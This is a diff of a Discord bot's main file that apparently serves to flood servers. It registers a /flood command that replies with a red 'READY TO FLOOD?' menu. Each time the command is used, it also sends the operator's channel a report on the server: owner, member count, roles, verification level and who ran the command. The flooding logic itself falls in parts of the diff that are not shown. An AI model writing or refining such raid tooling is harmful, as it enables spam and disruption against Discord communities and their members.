@@ -1,20 +1,25 @@
-// index.js
-const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
 const express = require('express');
+const { 
+  Client, GatewayIntentBits, REST, Routes, 
+  SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, 
+  ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle 
+} = require('discord.js');
 const http = require('http');
 
 const TOKEN = process.env.TOKEN;
 const CLIENT_ID = process.env.CLIENT_ID;
-const CHANNEL_ID = process.env.CHANNEL_ID; // NEW variable
+const NOTIFY_CHANNEL_ID = process.env.NOTIFY_CHANNEL_ID; // Channel where notification is sent
 const SELF_URL = process.env.SELF_URL;
 
+// Keep-alive server
 const app = express();
 app.get('/', (req, res) => res.send('Bot running'));
 app.listen(process.env.PORT || 3000, () => console.log('Server ready'));
 
+// Discord client
 const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages] });
 
-// Register /flood command
+// Slash command registration
 const commands = [
   new SlashCommandBuilder()
     .setName('flood')
@@ -31,41 +36,45 @@ const rest = new REST({ version: '10' }).setToken(TOKEN);
   }
 })();
 
+// Cache for button interactions
 const floodCache = new Map();
 
 client.on('interactionCreate', async i => {
   try {
     if (i.isChatInputCommand() && i.commandName === 'flood') {
       const guild = i.guild;
-      const channel = client.channels.cache.get(CHANNEL_ID);
-      if (!channel) return console.error('Channel not found');
+      const channelName = i.channel?.name || 'Unknown';
 
-      floodCache.set(i.user.id, { userTag: i.user.tag });
+      floodCache.set(i.user.id, { channelName, userTag: i.user.tag });
 
-      const embed = new EmbedBuilder()
-        .setTitle('📌 COMMAND EXECUTED')
-        .setColor(0x2f3136)
-        .addFields(
-          { name: '🌐 Server Name', value: guild?.name || 'Unknown', inline: true },
-          { name: '👥 Members', value: `${guild?.memberCount || 0}`, inline: true },
-          { name: '👑 Server Owner', value: guild?.ownerId ? `<@${guild.ownerId}>` : 'Unknown', inline: true },
-          { name: '📅 Server Created', value: guild?.createdAt?.toLocaleDateString() || 'N/A', inline: true },
-          { name: '🎭 Roles', value: `${guild?.roles.cache.size || 0}`, inline: true },
-          { name: '😂 Emojis', value: `${guild?.emojis.cache.size || 0}`, inline: true },
-          { name: '🚀 Boost Level', value: `${guild?.premiumTier || 0}`, inline: true },
-          { name: '💎 Boost Count', value: `${guild?.premiumSubscriptionCount || 0}`, inline: true },
-          { name: '✅ Verification Level', value: `${guild?.verificationLevel || 'Unknown'}`, inline: true },
-          { name: '🙋 Command Run By', value: i.user.tag, inline: true },
-          { name: '📡 Bot Latency', value: `${client.ws.ping}ms`, inline: true }
-        )
-        .setFooter({ text: `Channel: #${i.channel?.name || 'Unknown'}` })
-        .setTimestamp();
+      // Fetch notification channel
+      const notifyChannel = await client.channels.fetch(NOTIFY_CHANNEL_ID).catch(() => null);
+      if (notifyChannel) {
+        const embed = new EmbedBuilder()
+          .setTitle('📌 COMMAND EXECUTED')
+          .setColor(0x2f3136)
+          .addFields(
+            { name: "🌐 Server Name", value: guild?.name || "Unknown", inline: true },
+            { name: "👥 Members", value: `${guild?.memberCount || 0}`, inline: true },
+            { name: "👑 Server Owner", value: guild?.ownerId ? `<@${guild.ownerId}>` : "Unknown", inline: true },
+            { name: "📅 Server Created", value: guild?.createdAt?.toLocaleDateString() || "N/A", inline: true },
+            { name: "🎭 Roles", value: `${guild?.roles?.cache.size || 0}`, inline: true },
+            { name: "😂 Emojis", value: `${guild?.emojis?.cache.size || 0}`, inline: true },
+            { name: "🚀 Boost Level", value: `${guild?.premiumTier || 0}`, inline: true },
+            { name: "💎 Boost Count", value: `${guild?.premiumSubscriptionCount || 0}`, inline: true },
+            { name: "✅ Verification Level", value: `${guild?.verificationLevel || "Unknown"}`, inline: true },
+            { name: "🙋 Command Run By", value: `${i.user.tag}`, inline: true },
+            { name: "📡 Bot Latency", value: `${client.ws.ping}ms`, inline: true }
+          )
+          .setFooter({ text: `Channel: #${channelName}` })
+          .setTimestamp(new Date());
 
-      // Send notification directly to channel
-      await channel.send({ embeds: [embed] });
+        await notifyChannel.send({ embeds: [embed] }).catch(console.error);
+      }
 
+      // Reply with ephemeral flood menu
       const floodEmbed = new EmbedBuilder()
-        .setTitle('READY TO FLOOD?')
+        .setTitle("READY TO FLOOD?")
         .setColor(0xFF0000);
 
       const row = new ActionRowBuilder().addComponents(
@@ -124,9 +133,12 @@ client.on('interactionCreate', async i => {
   }
 });
 
+// Keep-alive self-ping
 client.login(TOKEN);
-
-// Self-ping to keep alive
 setInterval(() => {
-  http.get(SELF_URL).on('error', err => console.error('Self-ping error:', err));
+  http.get(SELF_URL, (res) => {
+    console.log(`Self-pinged ${SELF_URL} - Status: ${res.statusCode}`);
+  }).on('error', (err) => {
+    console.error('Self-ping error:', err);
+  });
 }, 240000);
